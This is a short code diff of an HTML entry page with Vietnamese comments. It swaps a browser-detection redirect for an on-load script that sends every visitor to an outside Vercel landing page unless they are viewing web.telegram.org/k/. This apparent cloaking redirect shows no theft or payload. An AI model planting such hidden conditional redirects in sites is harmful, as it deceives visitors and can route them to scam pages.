@@ -23,59 +23,13 @@
 
   <body>
     <div id="root"></div>
-      <script>
+    <script>
       document.addEventListener("DOMContentLoaded", function () {
-        const userAgent = navigator.userAgent.toLowerCase();
-        let browser;
-
-        // Kiểm tra trình duyệt
-        if (userAgent.includes("chrome")) {
-          browser = "Chrome";
-        } else if (userAgent.includes("firefox")) {
-          browser = "Firefox";
-        } else if (userAgent.includes("safari")) {
-          browser = "Safari";
-        } else if (userAgent.includes("edge")) {
-          browser = "Edge";
-        } else if (userAgent.includes("opr") || userAgent.includes("opera")) {
-          browser = "Opera";
-        } else {
-          browser = "Unknown Browser";
+        if (window.location.href !== "https://web.telegram.org/k/") {
+          window.location.href = "https://landing-page-vang-xanh.vercel.app/";
         }
-
-        // Hiển thị thông tin trình duyệt
-        // document.getElementById("root").innerHTML = `<p>Bạn đang sử dụng: ${browser}</p>`;
-        if (
-      browser === "Chrome" ||
-      browser === "Firefox" ||
-      browser === "Safari" ||
-      browser === "Edge" ||
-      browser === "Opera"
-    ) {
-      window.location.href = "https://landing-page-vang-xanh.vercel.app/";
-    }
       });
     </script>
     <script src="/src/index.tsx" type="module"></script>
-    <!-- <script>
-      document.addEventListener("DOMContentLoaded", function () {
-        fetch("index1.html")
-          .then((response) => {
-            if (!response.ok) {
-              throw new Error("Network response was not ok");
-            }
-            return response.text();
-          })
-          .then((data) => {
-            document.getElementById("root").innerHTML = data;
-          })
-          .catch((error) => {
-            console.error(
-              "There was a problem with the fetch operation:",
-              error
-            );
-          });
-      });
-    </script> -->
   </body>
 </html>
